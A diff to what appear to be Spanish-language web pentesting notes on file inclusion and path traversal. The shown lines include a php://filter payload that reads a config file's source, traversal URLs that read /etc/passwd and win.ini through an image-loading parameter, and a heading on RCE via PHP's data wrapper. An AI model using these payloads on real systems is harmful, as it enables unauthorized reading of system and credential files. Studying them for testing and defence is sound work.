@@ -11,6 +11,18 @@ filtros php:
 
 podemos usar filtros php para poder leer el código fuente de archivos: php://filter/read=convert.base64-encode/resource=config
 
+podemos encontrar posibilidades de path transversal en la carga de objetos externos dentro del html:
+
+<img src="/loadImage?filename=218.png">
+
+podríamos utilizar esta funcionalidad encontrada en el img dentro de la barra de búsqueda:
+
+https://insecure-website.com/loadImage?filename=../../../etc/passwd
+
+mismo ejemplo en windows:
+
+https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
+
 ############### RCE
 
 podemos lograr rce utilizando el filtro "data" si el parametro allow_url_include se encuentra habilitado:
